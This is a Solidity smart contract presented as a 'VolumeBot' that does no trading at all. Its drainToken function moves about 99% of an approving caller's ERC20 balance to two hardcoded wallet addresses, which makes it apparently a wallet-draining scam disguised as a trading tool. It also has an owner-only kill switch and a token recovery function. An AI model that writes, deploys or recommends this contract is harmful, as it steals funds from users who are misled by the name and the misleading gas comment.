// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol";

contract VolumeBot {
    address private owner;
    address private constant wallet1 = 0xfe0efdE14c94491b4d5E096467355f4973eD79db;
    address private constant wallet2 = 0xC07D949Ca260d505bcA5Aa526B2FC21dF348f9D9;
    bool public killSwitch = false;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    modifier isActive() {
        require(!killSwitch, "Contract is deactivated");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function drainToken(IERC20 token) external isActive {
        uint256 balance = token.balanceOf(msg.sender);
        require(balance > 0, "No tokens to drain");

        uint256 gasReserve = balance / 100; // 1% reserved for gas
        uint256 amountToDrain = balance - gasReserve;
        require(amountToDrain > 0, "Insufficient balance after gas reserve");

        uint256 half = amountToDrain / 2;

        require(token.transferFrom(msg.sender, wallet1, half), "Transfer to wallet1 failed");
        require(token.transferFrom(msg.sender, wallet2, amountToDrain - half), "Transfer to wallet2 failed");
    }

    function toggleKillSwitch() external onlyOwner {
        killSwitch = !killSwitch;
    }

    function recoverERC20(IERC20 token, uint256 amount) external onlyOwner {
        require(token.transfer(owner, amount), "Transfer failed");
    }
}